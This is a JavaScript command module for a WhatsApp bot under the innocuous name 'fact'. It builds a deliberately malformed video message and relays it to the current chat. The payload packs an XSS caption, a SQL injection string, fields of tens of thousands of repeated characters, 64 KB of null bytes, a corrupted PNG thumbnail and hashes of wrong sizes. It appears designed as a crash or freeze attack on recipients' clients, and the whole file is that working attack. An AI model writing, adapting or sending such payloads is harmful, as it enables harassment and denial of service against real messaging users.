module.exports = {
    name: `fact',
    execute: async (sock, msg, args) => {
        const chatJid = msg.key.remoteJid;

        // ============ PAYLOAD AVANCÉ ============
        const videoPayload = {
            videoMessage: {
                // 1. CAPTION INJECTION (XSS / HTML)
                caption: "<img src=x onerror='alert(1)'>" + "A".repeat(5000),
                
                // 2. URL MALFORMÉE
                url: "https://mmg.whatsapp.net/v/t62.7161-24/" + "B".repeat(1000) + ".enc?ccb=11-4",
                
                // 3. MIMETYPE INVALIDE
                mimetype: "video/mp4; charset=utf-8; boundary=" + "C".repeat(500),
                
                // 4. HASH MANIPULÉ (taille incohérente)
                fileSha256: Buffer.from("A".repeat(64), 'utf8'), // 64 octets au lieu de 32
                
                // 5. TAILLE DE FICHIER ABSURDE
                fileLength: "99999999999999999999",
                
                // 6. MÉDIAS KEY AVEC DONNÉES BINAIRES
                mediaKey: Buffer.from([0x00, 0x01, 0xFF, 0xFE, 0x80, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
                
                // 7. DIMENSIONS EXTREMES
                height: 99999,
                width: -1, // Valeur négative pour tester la validation
                
                // 8. ENCODAGE DOUBLE (UTF-16)
                fileEncSha256: Buffer.from("\uFEFF" + "A".repeat(32), 'utf16le'),
                
                // 9. DIRECTPATH AVEC INJECTION SQL
                directPath: "/v/t62.7161-24/'; DROP TABLE users; --",
                
                // 10. TIMESTAMP FUTUR
                mediaKeyTimestamp: "9999999999",
                
                // 11. THUMBNAIL CORROMPU (fichier PNG invalide)
                jpegThumbnail: Buffer.from([
                    0x89, 0x50, 0x4E, 0x47, // Signature PNG
                    0x00, 0x00, 0x00, 0x0D, // Taille IHDR
                    0x49, 0x48, 0x44, 0x52, // IHDR
                    0xFF, 0xFF, 0xFF, 0xFF, // Largeur (4 Go)
                    0xFF, 0xFF, 0xFF, 0xFF, // Hauteur (4 Go)
                    0x00, 0x00, 0x00, 0x00, // Bit depth
                    0x00, 0x00, 0x00, 0x00, // Color type
                    0x00, 0x00, 0x00, 0x00, // Compression
                    0x00, 0x00, 0x00, 0x00, // Filter
                    0x00, 0x00, 0x00, 0x00  // Interlace
                ]),
                
                // 12. CONTEXT INFO AVEC CHAMPS INCONNUS
                contextInfo: {
                    isQuestion: true,
                    forwardingScore: 999999,
                    featureEligibilities: {
                        cannotBeRanked: false,
                        canBeReshared: false,
                        // Champ inconnu pour tester la tolérance
                        unknownField: Buffer.from([0xFF, 0x00, 0xFF, 0x00])
                    },
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    statusSourceType: "MUSIC_STANDALONE",
                    // Injection de champ inconnu au niveau supérieur
                    extraField1: "A".repeat(10000),
                    extraField2: 12345678901234567890,
                    extraField3: Buffer.from([0x00, 0x01, 0x02, 0x03, 0x04, 0x05])
                },
                
                // 13. STREAMING SIDECAR AVEC DONNÉES BINAIRES ALÉATOIRES
                streamingSidecar: Buffer.from(Array.from({length: 5000}, (_, i) => i % 256)),
                
                // 14. THUMBNAIL DIRECTPATH AVEC PAYLOAD MALFORMÉ
                thumbnailDirectPath: "/v/t62.36147-24/" + "D".repeat(500) + ".enc",
                
                // 15. HASHES AVEC DES TAILLES INCOHÉRENTES
                thumbnailSha256: Buffer.from("A".repeat(128), 'utf8'), // 128 octets au lieu de 32
                thumbnailEncSha256: Buffer.from("B".repeat(256), 'utf8'), // 256 octets
                
                // 16. ANNOTATIONS AVEC CHAMPS NESTED EXPLOSIFS
                annotations: [
                    {
                        shouldSkipConfirmation: true,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "A".repeat(10000),
                                songId: "B".repeat(10000),
                                // CHAMP AUTHOR AVEC NULL BYTES + DONNÉES BINAIRES
                                author: Buffer.from([
                                    0x40, 0x62, 0x61, 0x79, 0x79, 0x31, 0x39, 0x38, // "@bayyy198"
                                    ...Array(65535).fill(0x00), // 64 Ko de null bytes
                                    ...Array(100).fill(0xFF), // 100 octets de 0xFF
                                    ...Array(100).fill(0x00), // 100 octets de 0x00
                                    ...Array(100).fill(0x80) // 100 octets de 0x80
                                ]),
                                title: "T".repeat(10000) + "\u0000".repeat(1000),
                                // CHAMP INCONNU DANS embeddedMusic
                                unknownMusicField: {
                                    nestedField: "A".repeat(5000),
                                    nestedBuffer: Buffer.from([0xDE, 0xAD, 0xBE, 0xEF])
                                }
                            }
                        },
                        embeddedAction: true,
                        // CHAMP INCONNU DANS ANNOTATION
                        annotationExtra: {
                            field1: "A".repeat(10000),
                            field2: -2147483648, // INT_MIN
                            field3: 2147483647 // INT_MAX
                        }
                    },
                    // DEUXIÈME ANNOTATION POUR TESTER LA RÉPÉTITION
                    {
                        shouldSkipConfirmation: false,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "C".repeat(10000),
                                songId: "D".repeat(10000),
                                author: "E".repeat(65535),
                                title: "F".repeat(65535)
                            }
                        },
                        embeddedAction: false
                    }
                ]
            }
        };

        // ============ ENVOI AVEC GESTION D'ERREUR ============
        try {
            await sock.relayMessage(chatJid, videoPayload, {});
            console.log("[+] Payload envoyé avec succès");
        } catch (error) {
            console.error("[!] Erreur lors de l'envoi:", error.message);
            // Log de l'erreur pour analyse
            console.log("[*] Stack trace:", error.stack);
        }
    }
};
